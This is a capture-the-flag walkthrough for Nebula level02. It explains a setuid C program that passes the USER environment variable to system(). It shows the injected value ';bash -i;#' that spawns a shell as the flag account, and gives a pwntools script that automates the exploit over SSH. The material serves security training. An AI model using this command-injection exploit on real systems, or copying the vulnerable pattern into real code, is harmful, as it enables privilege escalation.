# Level02

#### Description

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the **level02** account with the password **level02**. Files for this level can be found in /home/flag02.

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

#### Solution

Looking at the source code above it is reading gid and uid of the running process and sets the real, effective, and saved GID/UID to those effective values. In short: it makes all three IDs identical to the current effective IDs. Next it is fetching the `USER` environment variable (Which we can control). After that it calls the shell to run the command. In this example it will run `/bin/echo <USER> is cool`, so the program prints something like `hacker is cool` .

As it is fetching and running USER environment variable, what if USER contains something vulnerable, maybe reverse shell or something like this `USER=';bash -i;#'` .

```bash
level02@nebula:/home/flag02$ export USER=';bash -i;#'
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ;bash -i;# is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level02', password='level02')

# start a remote shell
terminal = session.shell()

# Changing USER environment variable
terminal.sendline("export USER=';bash -i;#'")

# Executing target binary
terminal.sendline('/home/flag02/flag02')
terminal.sendline("getflag")

terminal.interactive()
```
